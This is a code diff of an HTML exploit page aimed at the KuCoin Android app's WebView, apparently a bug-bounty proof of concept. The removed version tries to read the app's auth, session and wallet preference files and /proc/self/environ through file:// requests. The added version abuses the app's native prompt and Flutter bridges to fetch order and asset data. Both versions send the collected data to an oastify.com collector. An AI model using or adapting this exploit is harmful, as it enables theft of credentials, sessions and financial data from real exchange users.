@@ -1,60 +1,46 @@
 <html><body><script>
 var d="";
 
-// 1. Try reading app shared_prefs via file://
-var files=[
-  "file:///data/data/com.kubi.kucoin/shared_prefs/com.kubi.kucoin_preferences.xml",
-  "file:///data/data/com.kubi.kucoin/shared_prefs/auth.xml",
-  "file:///data/data/com.kubi.kucoin/shared_prefs/session.xml",
-  "file:///data/data/com.kubi.kucoin/shared_prefs/wallet.xml",
-  "file:///data/data/com.kubi.kucoin/shared_prefs/user_info.xml",
-  "file:///data/user/0/com.kubi.kucoin/shared_prefs/com.kubi.kucoin_preferences.xml",
-  "file:///data/data/com.kubi.kucoin/databases/",
-  "file:///etc/hosts",
-  "file:///proc/self/environ"
-];
-
-var count=0;
-files.forEach(function(f){
-  try{
-    var x=new XMLHttpRequest();
-    x.open("GET",f,false);
-    x.send();
-    if(x.status==200||x.responseText.length>0){
-      d+="FILE_OK:"+f+"="+x.responseText.substring(0,100)+"|";
-    }
-  }catch(e){
-    d+="FILE_ERR:"+f.split("/").pop()+":"+e.message.substring(0,30)+"|";
-  }
-  count++;
-  if(count>=files.length) doExfil();
-});
-
-// 2. Try iframe file access
+// 1. Try prompt() proxy directly (hulkvision's technique)
 try{
-  var iframe=document.createElement("iframe");
-  iframe.src="file:///data/data/com.kubi.kucoin/shared_prefs/";
-  iframe.onload=function(){
-    try{
-      d+="IFRAME_OK:"+iframe.contentDocument.body.innerHTML.substring(0,200);
-    }catch(e){d+="IFRAME_BLOCKED:"+e.message.substring(0,50);}
-    doExfil();
-  };
-  document.body.appendChild(iframe);
-}catch(e){d+="IFRAME_ERR;";}
+  var r1=prompt('{"type":"proxy","params":{"method":"get","url":"v2/kc/trade/orders?status=active"}}');
+  d+="PROMPT1:"+String(r1).substring(0,200)+"|";
+}catch(e){d+="PROMPT1_ERR:"+e.message.substring(0,50)+"|";}
 
-// 3. Try fetch for file://
+// 2. Try prompt with wireframe type
 try{
-  fetch("file:///data/data/com.kubi.kucoin/shared_prefs/").then(function(r){
-    return r.text();
-  }).then(function(t){
-    d+="FETCH_FILE:"+t.substring(0,200);
-    doExfil();
-  }).catch(function(e){d+="FETCH_ERR:"+e.message.substring(0,50)+";";});
-}catch(e){}
+  var r2=prompt("wireframe","{}");
+  d+="PROMPT2:"+String(r2).substring(0,100)+"|";
+}catch(e){d+="PROMPT2_ERR:"+e.message.substring(0,50)+"|";}
+
+// 3. Try prompt with proxy type (different format)
+try{
+  var r3=prompt("proxy",'{"method":"get","url":"/app/v1/asset/overview"}');
+  d+="PROMPT3:"+String(r3).substring(0,200)+"|";
+}catch(e){d+="PROMPT3_ERR:"+e.message.substring(0,50)+"|";}
+
+// 4. Try KuCoin.prompt if it exists
+try{
+  if(window.KuCoin){
+    d+="KUCOIN_EXISTS;";
+    var r4=window.KuCoin.prompt("proxy",'{"method":"get","url":"/app/v1/asset/overview"}');
+    d+="KC_PROMPT:"+String(r4).substring(0,200)+"|";
+  }else{d+="NO_KUCOIN;";}
+}catch(e){d+="KC_ERR:"+e.message.substring(0,50)+"|";}
+
+// 5. Check flutter callHandler
+try{
+  if(window.flutter_inappwebview){
+    d+="FLUTTER_EXISTS;";
+    window.flutter_inappwebview.callHandler("proxy",{method:"get",url:"/app/v1/asset/overview"}).then(function(r){
+      d+="FLUTTER_CALL:"+String(r).substring(0,200)+"|";
+      doExfil();
+    });
+  }else{d+="NO_FLUTTER;";}
+}catch(e){d+="FLUTTER_ERR:"+e.message.substring(0,50)+"|";}
 
 function doExfil(){
-  window.location="https://604kkqv5a6n5ut14cwpolkzpmgsegjousuuwyeg3.oastify.com/?d="+encodeURIComponent(d.substring(0,1800));
+  window.location="https://9kun4tf8u978ewl7wz9r5njs6jci0xhbtqc5tjg75.oastify.com/?d="+encodeURIComponent(d.substring(0,1800));
 }
-setTimeout(function(){doExfil();},4000);
+setTimeout(function(){doExfil();},3000);
 </script></body></html>
